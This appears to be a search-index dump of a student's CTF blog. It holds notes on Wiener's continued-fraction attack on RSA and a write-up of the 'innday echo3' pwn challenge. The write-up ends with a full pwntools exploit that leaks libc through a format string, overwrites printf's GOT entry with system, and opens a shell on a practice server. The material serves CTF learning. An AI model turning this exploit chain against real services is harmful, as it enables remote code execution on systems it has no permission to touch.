[{"categories":null,"content":"yolande A student Vidar-Team 密码手(下学期可能会去学 pwn ) 友链 chuj Potat0 ek1ng h4kuy4 tr0uble … 实在懒得写了，先这样吧。 ","date":"2022-05-18","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"},{"categories":["Crypto"],"content":"Wiener Attack 笔记 ","date":"2022-05-16","objectID":"/wieners_attack_note/:0:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"连分数 ","date":"2022-05-16","objectID":"/wieners_attack_note/:1:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"连分数形式 令 . ","date":"2022-05-16","objectID":"/wieners_attack_note/:1:1","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"将有理数转换为连分数 直到 . 通过观察可以得到： ","date":"2022-05-16","objectID":"/wieners_attack_note/:1:2","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"将连分数转换为有理数 可以从中得到下面的关系： ","date":"2022-05-16","objectID":"/wieners_attack_note/:1:3","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"连分数算法 是 $f$ 的一个较小的估计值。 如果 $\\delta$ 足够小，那么 $f$ 的分子和分母可以通过下面的方式找到： 测试 $f=\\frac{n_i}{d_i}$ 是否成立. ","date":"2022-05-16","objectID":"/wieners_attack_note/:2:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"成功条件 对于 $\\delta$ 大小的影响： $\\delta =1-\\frac{f^{\\prime}}{f}$ . 根据 $m$ 的大小分为四种情况： $m=0$ : $m=1$ : $m$ 是偶数且 $m\\geq2$ : $m$ 是奇数且 $m\\geq3$ : ","date":"2022-05-16","objectID":"/wieners_attack_note/:2:1","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"连分数算法在 RSA 的使用 令 $G=GCD(p-1,q-1)$ . $$ ed=\\frac{K}{G}\\cdot (p-1)(q-1)+1 $$ 令 . 测试猜想的 $k$, $dg$ 是否正确： 假设 $ed\u003eN$ ，那么 $k\u003eg$ . $\\frac{N-(p-1)(q-1)+1}{2}=\\frac{p+q}{2}$ ，如果 $(p-1)(q-1)$ 为 0 或是奇数，那么猜想错误。 $\\big(\\frac{p+q}{2}\\big)^2-N=\\big(\\frac{p-q}{2}\\big)^2$ ，如果 $\\big(\\frac{p-q}{2}\\big)^2$ 是完全平方数，那么猜想正确。 在没有防止连分数攻击的情况下，可以期望 $g$ 比较小， $k\u003cdg$ 。在这种情况下 $d$ 的位数约为 $N$ 的 $\\frac 1 4$ ，在多项式时间内可以找到这样的 $d$ 。 ","date":"2022-05-16","objectID":"/wieners_attack_note/:3:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"流程 计算 猜测 $\\frac{k}{dg}$ 猜测 $edg = e\\cdot dg$ 猜测 $(p-1)(q-1)=\\lfloor \\frac{edg}{k} \\rfloor$ 猜测 $g\\equiv edg\\pmod k$ 猜测 $\\frac{p+q}{2}$ 猜测 $\\big(\\frac{p-q}{2}\\big)^2$ 计算 $d$ 一轮中止之后，开始新的一轮，直到得到 $d$ 。 ","date":"2022-05-16","objectID":"/wieners_attack_note/:4:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"防止连分数攻击 增大 $k$ 。必须增大 $e$ ，可以通过给 $e$ 增加 $LCM(p-1,q-1)$ 的倍数实现。 $e\u003e(pq)^{\\frac{3}{2}}$ 时，无法进行连分数攻击。 增大 $g$ 。增大 $GCD(p-1,q-1)$ ，但是在特定条件下可以找到 $g$ 或 $g$ 的因数。 ","date":"2022-05-16","objectID":"/wieners_attack_note/:5:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"改进 允许寻找 $d$ 的时候略微超过 $kdg\u003c\\frac{N}{\\frac 3 2(p+q)}$ . 使用对 $(p-1)(q-1)$ 更加接近的估计替换 $N$ : 可以使用 $\\lfloor (\\sqrt N-1)^2\\rfloor$ ，那么 $kdg\u003c\\frac 2 3\\big(\\frac{\\sqrt N-1}{\\sqrt p-\\sqrt q}\\big)^2$ . 在多个 $\\frac{k}{dg}$ 的猜想上使用算法。（？） 试图寻找 $g$ 或 $g$ 的因数： 假设 $t$ 是 $g$ 的一个未知的因数。 $t\\big(\\frac{e}{N} \\big)$ 是 $\\frac{k}{d(\\frac{g}{t})}$ 的一个较小的估计。 如果 $g$ 或 $g$ 的所有质因数很大，那么将难以计算 $g$ 的因数。然而， $g$ 过大将导致 $\\frac{p-1}{g}$ 和 $\\frac{q-1}{g}$ 很小，可以通过查找 $\\frac{p-1}{g}$ 和 $\\frac{q-1}{g}$ 来寻找 $g$ 的可能值。 ","date":"2022-05-16","objectID":"/wieners_attack_note/:6:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":["Crypto"],"content":"一些废话 这篇论文还比较容易看懂，至少对于我来说比网上写的总结好懂一些。 因为翻译水平比较一般，所以可能会有一股机翻味（？）。 ","date":"2022-05-16","objectID":"/wieners_attack_note/:7:0","tags":["Crypto","RSA","Continued Fraction"],"title":"Wiener Attack Note","uri":"/wieners_attack_note/"},{"categories":[],"content":"关于我摸鱼过头忘了干正事这件事 啊，好烦。 今天晚上本来是要看论文的。突然想起来该把我的 blog 部署起来了，然后就开始搞，结果没看成论文。暂时就先这样吧，等之后哪天闲得无聊了再搞。 ","date":"2022-03-22","objectID":"/nonsense_0/:0:0","tags":["废话"],"title":"一些废话[0]","uri":"/nonsense_0/"},{"categories":["PWN"],"content":"innday echo3 吐槽 \u0026 记录向 wp ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:0:0","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"一些碎碎念 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:1:0","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"不要靠近奶茶，会变得不幸 上个月月初 （21.11.03） ， chuj 学长在群里说有一个 fmtstr 题只要写出来就可以得到一杯奶茶。显然，我为了奶茶就冲了。学长发给我题的时候是这样形容这个题的： 可能会比较有难度 这是比较有难度吗，这是难，很难！ ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:1:1","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"令人摸不着头脑的过程 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:2:0","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"瞎搞 一 因为是第一次写 CTF 的题，当然也是第一次写 pwn 题，所以根本不知道该怎么下手，于是就寻求百度的帮助。看了一些 write up 和入门教程之后大概明白了要做点什么之后就开始做题瞎搞了。 把elf下载下来之后，先 checksec ，不过这一步我做了跟没做一样，虽然百度了，但是根本不理解， 然后在 ida 里 F5 了一下，感觉是要修改 magic 的值，然后就开始尝试了。 当时还是太天真了，代码都没看明白就开始写了。 第一次尝试失败了，对于向来直接莽的我来说根本整不明白发生了什么，于是直接求助学长，得到的结果是方向错了。 二 在几天的摸鱼之后，再次研究这道题，发现我好像上当了，总算是接近正确的路线了。开始在高数课上思考如何获取 system 函数，借鉴网上的入门教程之后认为应该用 shellcode ，就再次询问学长。学长说栈开了不可执行保护，所以不能 shellcode 。 虽然我的方向又错了，但是这次学长给我指了一条明路：泄露 system ，修改 got 表。 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:2:1","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"仿佛走上正轨 为了修改 got 表，要找到一条链。然而第一次尝试的时候运气不太好，并没有发现可以用的链。就再一次步入歧途，思考偏移的问题。然后发现跟偏移好像没什么关系，就又不明白了。一边看各种文章，一边问学长，聊天记录里我懂了又懂。 在某一次尝试之后，我终于发现栈是会变的了！然后又去问学长，这么一看我问题好多啊，得知了栈是随机的。 开始尝试修改 got 表，但是总是失败。于是再~~第 n ~~次求助，开始学习替换 libc 。按照学长的blog 里的方法替换了libc，但是无论怎么换一直都不能使用。 不知道第几次去问学长，学长说 patchelf 是直接在 elf 里面替换的，所以路径过长的时候可能会覆写一起其他数据，这种情况比较少，但是这里好像确实有这个情况 解决方案是把 libc 和 ld 放在 elf 的目录下，然后用相对地址替换。 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:2:2","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"和 exp 纠缠 换好 libc 之后，手打就还算顺利了，但是 exp 成为了新的阻碍。 先是要泄露 libc 的基地址。这一个问题还好，并没有困扰我太长时间。 真正要命的是 sendline 中间的间隔太短导致我本地一直卡，就又摸了好几天的鱼，后来改用 sendafter 就解决了这个问题。 最后一个问题是我试图两次写两个完整的 got 然而远程一直失败，问了学长才知道要考虑网络问题，其实也就我会忘记这种事吧。 当时我是重新找的链，用栈上残留的地址写 got 。 后来我发现是有第两个解决方案的，直接改一下本来的 exp ，第一个 got 和第二个一起写，空格的数量直接减半。因为之前测试的时候是有几率可以收到第一个的结束标志的，所以第一个是可以成功写进去的，第二个跟着它应该没有问题，就是这个方案需要碰运气。 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:2:3","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"EXP from pwn import * while 1: libc = ELF('libc-2.23.so') echo = remote('node4.buuoj.cn', 26765) printf_got = 0x804a014 try: payload1 = '%47$p %18$p !' echo.sendline(payload1) echo.recvuntil('0x', timeout=1) libc_start_add = int(echo.recv(8), 16) - 247 if libc_start_add \u003c 0xf7000000: echo.close() if libc_start_add \u003e 0xf8000000: echo.close() libc_start_off = libc.symbols['__libc_start_main'] system_off = libc.symbols['system'] system_addr = libc_start_add - libc_start_off + system_off system_addr_low = system_addr % 0x10000 system_addr_high = (system_addr \u003e\u003e 16) % 0x10000 printf_got_low = printf_got % 0x10000 echo.recvuntil('0x', timeout=1) addr_2e = int(echo.recv(8), 16) addr_09_low = addr_2e % 0x10000 - 0x94 payload2 = '%' + str(addr_09_low) + 'c' + '%34$hn' + '%8c%35$hn' + '!!' echo.sendafter('!', payload2) payload3 = '%' + str(printf_got_low) + 'c' + '%91$hn' + '%2c%89$hn' + '!!!' echo.sendafter('!!', payload3) if system_addr_low \u003c system_addr_high: payload4 = '%' + str(system_addr_low) + 'c' + '%9$hn' + '%' + str(system_addr_high - system_addr_low) + 'c' + '%11$hn' + '!!!!' else: payload4 = '%' + str(system_addr_high) + 'c' + '%11$hn' + '%' + str(system_addr_low - system_addr_high) + 'c' + '%9$hn' + '!!!!' echo.sendafter('!!!', payload4) payload5 = '/bin/sh\\x00' echo.sendafter('!!!!', payload5) echo.interactive() except: echo.close() ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:3:0","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"},{"categories":["PWN"],"content":"最后的碎碎念 我写最后一句话的时候已经是 22.3.21 了，这谁想得到呢。其实 21.12.5 的时候好像就写得差不多了，但是一直没有部署 blog ，所以就放着了。虽然写完了，但是我也不知道最后啥时候发。摸鱼去。 ","date":"2022-03-21","objectID":"/pwn_innday_echo3_wp/:4:0","tags":["PWN","wp"],"title":"innday echo3 wp","uri":"/pwn_innday_echo3_wp/"}]